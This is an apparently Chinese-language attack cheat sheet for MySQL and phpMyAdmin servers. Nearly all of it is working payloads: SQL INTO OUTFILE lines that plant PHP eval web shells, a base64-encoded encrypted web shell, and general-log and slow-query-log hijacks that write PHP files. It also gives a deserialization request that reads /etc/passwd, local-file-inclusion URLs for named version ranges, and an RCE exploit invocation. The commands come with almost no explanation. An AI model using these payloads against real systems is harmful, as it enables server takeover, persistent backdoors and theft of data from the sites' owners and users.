  #### 拿shell
  	show variables like '%secure%'    
	select '<?php eval($_POST[x]) ?>' into outfile '/var/www/xx.php';  
	select '<?php eval($_POST[x]) ?>' into dumpfile '/var/www/xx.php';  
	select '<?php file_put_contents("1.php",base64_decode("Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K"));?>' into outfile 'C:/wamp/www/1.php';
  #### LOG
	show variables like '%general%';  #查看配置
	set global general_log = on;  #开启general log模式
	set global general_log_file = '/var/www/html/1.php'; 
	select '<?php eval($_POST[cmd]);?>'
  #### 慢查询
	show variables like '%slow%';
	set GLOBAL slow_query_log_file='C:/WWW/slow.php';
	set GLOBAL slow_query_log=on;
	set GLOBAL log_queries_not_using_indexes=on;
	select '<?php phpinfo();?>' from mysql.db where sleep(10);
  #### 任意文件读取
	phpMyAdmin 2.x
	POST /scripts/setup.php HTTP/1.1
	Host: ip:8080
	Accept-Encoding: gzip, deflate
	Accept: */*
	Accept-Language: en
	User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
	Connection: close
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 80
	
	action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
  #### LFI
	phpMyAdmin 4.0.1--4.2.12，PHP < 5.3.4
	/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&gis_data[gis_type]=/../../../../phpinfo.txt%00
	phpMyAdmin 4.8.0和4.8.1 后台权限
	>select '<?php phpinfo();exit;?>'
	/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_***
  #### RCE
	PhpMyAdmin 4.0.x-4.6.2，PHP 4.3.0-5.4.6后台权限
	>cve-2016-5734.py -u root --pwd="" http://localhost/pma -c "system('ls -lua');"
	phpMyAdmin 4.8.0~4.8.3
	CREATE DATABASE foo;
	CREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );
	INSERT INTO foo.bar SELECT '<?php phpinfo(); ?>';
	访问http://10.1.1.10/chk_rel.php?fixall_pmadb=1&db=foo
	INSERT INTO pma__column_infoSELECT '1', 'foo', 'bar', 'baz', 'plop',
	'plop', 'plop', 'plop','../../../../../../../../tmp/sess_***','plop';
	访问
	/tbl_replace.php?db=foo&table=bar&where_clause=1=1&fields_name[multi_edit][][]=baz&clause_is_unique=1
